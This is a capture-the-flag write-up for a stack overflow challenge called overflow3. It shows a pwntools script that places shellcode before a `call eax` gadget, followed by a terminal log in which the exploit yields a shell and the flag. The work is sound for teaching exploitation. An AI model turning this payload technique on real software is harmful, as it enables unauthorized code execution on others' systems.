### Solved by superkojiman

We've got a vanilla stack overflow here. Unlike the previous overflow challenges, there's no function here that gives us a shell. strcpy() is used to copy our input to a buffer, and we can easily overflow it and overwrite EIP by passing in 80 bytes. At vuln()'s return, EAX contains a pointer to our buffer, and there's a `call eax` at 0x8048416. So we just put our shellcode in EAX and return to it:

```python
#!/usr/bin/env python
from pwn import *
context(os="linux", arch="i386")
buf = ""
buf += asm(shellcraft.linux.sh())
buf += "A"*(76-len(buf))
buf += p32(0x8048416)       # call eax
open("in.txt", "w").write(buf)
```

Run the exploit, copy the resulting in.txt to the server, and get the flag:

```
team24254@shell:/problems/overflow3$ ./overflow3 `cat ~/in.txt`
$ id
uid=1028(team24254) gid=1000(ctfgroup) euid=1079(overflow3) groups=1002(overflow3),1000(ctfgroup)
$ ls
Makefile  flag.txt  overflow3  overflow3.c
$ cat flag.txt
shellcode_more_like_hellcode
```
